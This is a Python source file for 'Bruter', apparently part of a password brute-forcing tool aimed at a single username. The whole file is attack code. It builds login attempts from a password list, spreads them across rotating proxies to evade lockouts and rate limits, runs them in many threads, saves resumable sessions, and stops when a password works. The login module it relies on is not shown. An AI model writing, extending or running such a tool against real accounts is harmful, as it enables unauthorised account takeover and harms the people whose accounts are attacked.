# Date: 12/28/2018
# Author: Mohamed
# Description: Bruter

import queue
import time
import threading
import typing
from lib.browser import Browser
from lib.display import Display
from lib.proxy_manager import ProxyManager
from lib.password_manager import PasswordManager
from lib.const import max_time_to_wait, max_bots_per_proxy


class Bruter(object):
    def __init__(self, username: str, threads: int, passlist_path: str):

        self.is_alive = True
        self.is_found = False

        self.password: str = None
        self.username: str = username
        self.last_password: str = None

        self.bots_per_proxy = 0
        self.total_threads: int = threads

        self.proxy_manager = ProxyManager()
        self.display = Display(username, passlist_path)
        self.password_manager = PasswordManager(
            username, passlist_path, threads, self.display
        )

        self.browsers: typing.List[Browser] = []
        self.active_passwords: typing.List[str] = []
        self.unstarted_browsers: typing.List[Browser] = []

        # Locks
        self.lock_browsers = threading.RLock()
        self.lock_unstarted_browsers = threading.RLock()

        self.lock_active_passwords = threading.RLock()
        self.lock_password_manager = threading.RLock()

    def manage_session(self):
        if self.password_manager.is_read:
            if not self.password_manager.list_size or self.is_found:
                self.password_manager.session.delete()
        else:
            if self.is_found:
                self.password_manager.session.delete()
            else:
                self.password_manager.session.write(
                    self.password_manager.attempts,
                    self.password_manager.passlist,
                )

    def browser_manager(self):
        while self.is_alive:

            browsers: typing.List[Browser] = []

            with self.lock_browsers:
                browsers = [br for br in self.browsers]

            for browser in browsers:

                if not self.is_alive:
                    break

                if (
                    Display.account_exists == None
                    and Browser.account_exists != None
                ):
                    Display.account_exists = Browser.account_exists

                if not browser.is_active:
                    if browser.is_attempted and not browser.is_locked:
                        if browser.is_found and not self.is_found:
                            self.password = browser.password
                            self.is_found = True

                        with self.lock_password_manager:
                            self.password_manager.list_remove(browser.password)

                    self.remove_browser(browser)

                else:
                    if browser.start_time:
                        if (
                            time.time() - browser.start_time
                            >= max_time_to_wait
                        ):
                            browser.close()
                            with self.lock_active_passwords:
                                try:
                                    self.active_passwords.remove(
                                        browser.password
                                    )
                                except ValueError:
                                    pass

    def prune_browsers(self, browser) -> None:
        """Remove all the browsers with the same password as the given browser"""

        with self.lock_browsers:
            for br in list(self.browsers):
                if br == browser:
                    continue

                if br.password != browser.password:
                    continue

                try:
                    self.browsers.remove(br)
                except ValueError:
                    pass

                br.close()
                br.proxy.decr_usage()
                self.proxy_manager.dispose(br.proxy)

        with self.lock_unstarted_browsers:
            for br in list(self.unstarted_browsers):

                if br.password == browser.password:
                    try:
                        self.unstarted_browsers.remove(br)
                    except ValueError:
                        pass

    def remove_browser(self, browser: Browser) -> None:
        self.proxy_manager.dispose(browser.proxy)

        with self.lock_browsers:
            try:
                self.browsers.remove(browser)
            except ValueError:
                pass

        with self.lock_active_passwords:
            try:
                self.active_passwords.remove(browser.password)
            except ValueError:
                pass

        if browser.is_attempted:
            self.prune_browsers(browser)

    def attack(self):
        attack_started = False
        proxy_per_pwd = 3

        while self.is_alive:
            for pwd in self.password_manager.passlist:
                if not self.is_alive:
                    break

                with self.lock_unstarted_browsers:
                    if len(self.unstarted_browsers) >= self.total_threads:
                        break

                with self.lock_active_passwords:
                    if pwd in self.active_passwords:
                        continue

                is_added = False

                for _ in range(proxy_per_pwd):

                    with self.lock_unstarted_browsers:
                        if len(self.unstarted_browsers) >= self.total_threads:
                            break

                    proxy = self.proxy_manager.get_proxy()

                    if not proxy:
                        continue

                    with self.lock_unstarted_browsers:
                        self.unstarted_browsers.append(
                            Browser(self.username, pwd, proxy)
                        )

                        is_added = True

                if not is_added:
                    break

                with self.lock_active_passwords:
                    self.active_passwords.append(pwd)

                if not attack_started:
                    self.display.info("Starting attack...")
                    attack_started = True

            with self.lock_unstarted_browsers:
                for br in list(self.unstarted_browsers):
                    with self.lock_browsers:
                        if len(self.browsers) >= self.total_threads:
                            break
                        else:
                            self.browsers.append(br)

                    self.unstarted_browsers.remove(br)
                    threading.Thread(target=br.attempt, daemon=True).start()

    def start_daemon_threads(self):
        attack = threading.Thread(target=self.attack)
        browser_manager = threading.Thread(target=self.browser_manager)
        password_manager = threading.Thread(target=self.password_manager.start)

        attack.daemon = True
        browser_manager.daemon = True
        password_manager.daemon = True

        attack.start()
        browser_manager.start()
        password_manager.start()

        self.display.info("Searching for proxies...")

    def stop_daemon_threads(self):
        self.password_manager.stop()

    def start(self):
        self.display.info("Initiating daemon threads...")
        self.start_daemon_threads()

        last_attempt = 0
        while self.is_alive and not self.is_found:

            if (
                last_attempt == self.password_manager.attempts
                and self.password_manager.attempts
            ):
                time.sleep(0.65)
                continue

            browsers = []

            with self.lock_browsers:
                browsers = [br for br in self.browsers]

            for browser in browsers:

                self.display.stats(
                    browser.password,
                    self.password_manager.attempts,
                    len(self.browsers),
                )
                last_attempt = self.password_manager.attempts
                self.last_password = browser.password

                if not self.is_alive or self.is_found:
                    break

            if (
                self.password_manager.is_read
                and not self.password_manager.list_size
                and not len(self.browsers)
            ):
                self.is_alive = False

    def stop(self):
        self.is_alive = False
        self.manage_session()
        self.stop_daemon_threads()
        self.password_manager.session.is_busy = False